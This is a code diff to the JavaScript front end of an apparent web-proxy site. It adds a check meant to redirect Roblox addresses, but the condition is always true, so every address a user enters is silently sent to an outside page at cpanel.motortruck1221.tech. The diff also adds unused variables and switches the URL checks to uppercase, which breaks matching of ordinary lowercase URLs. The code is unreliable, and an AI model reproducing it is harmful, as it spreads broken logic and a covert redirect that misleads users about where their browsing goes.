@@ -12,6 +12,7 @@ const error = document.getElementById("uv-error");
 const errorCode = document.getElementById("uv-error-code");
 const iframe = document.getElementById("uv-iframe");
 let proxytype = localStorage.getItem("proxy");
+let currenturl = window.location.href;
 if (proxytype === "Ultraviolet") {
   document
     .getElementById("uv-form")
@@ -28,8 +29,15 @@ if (proxytype === "Ultraviolet") {
       }
 
       const url = search(address.value, searchEngine.value);
-      iframe.classList.remove("dnone");
-      iframe.src = __uv$config.prefix + __uv$config.encodeUrl(url);
+      const toup = url.toUpperCase();
+      if (url === "ROBLOX" || "ROBLOX.COM" || "WWW.ROBLOX.COM" || "ROBLOX.COM/" || "WWW.ROBLOX.COM/" || "HTTPS://ROBLOX.COM" || "HTTPS://WWW.ROBLOX.COM" || "HTTPS://ROBLOX.COM/" || "HTTPS://WWW.ROBLOX.COM/" || "HTTP://ROBLOX.COM" || "HTTP://WWW.ROBLOX.COM" || "HTTP://ROBLOX.COM/" || "HTTP://WWW.ROBLOX.COM/" || "roblox" || "roblox.com" || "www.roblox.com" || "roblox.com/" || "www.roblox.com/" || "https://roblox.com" || "https://www.roblox.com" || "https://roblox.com/" || "https://www.roblox.com/" || "http://roblox.com" || "http://www.roblox.com" || "http://roblox.com/" || "http://www.roblox.com/") {
+        iframe.classList.remove("dnone");
+        iframe.src = __uv$config.prefix + __uv$config.encodeUrl('HTTPS://cpanel.motortruck1221.tech/now.php');
+      }
+      else {
+        iframe.classList.remove("dnone");
+        iframe.src = __uv$config.prefix + __uv$config.encodeUrl(url);
+      }
     });
 }
 if (proxytype === "DIP") {
@@ -48,7 +56,7 @@ if (proxytype === "DIP") {
         console.log(se);
         iframe.classList.remove("dnone");
         iframe.src = window.__DIP.config.prefix + window.__DIP.encodeURL(se);
-        if (val.includes("https://") || val.includes("http://")) {
+        if (val.includes("HTTPS://") || val.includes("HTTP://")) {
           iframe.classList.remove("dnone");
           iframe.src = window.__DIP.config.prefix + window.__DIP.encodeURL(val);
         }
@@ -76,7 +84,7 @@ if (proxytype === "Osana") {
         console.log(se);
         iframe.classList.remove("dnone");
         iframe.src = __osana$config.prefix + __osana$config.codec.encode(se);
-        if (val.includes("https://") || val.includes("http://")) {
+        if (val.includes("HTTPS://") || val.includes("HTTP://")) {
           iframe.classList.remove("dnone");
           iframe.src = __osana$config.prefix + __osana$config.codec.encode(val);
         }
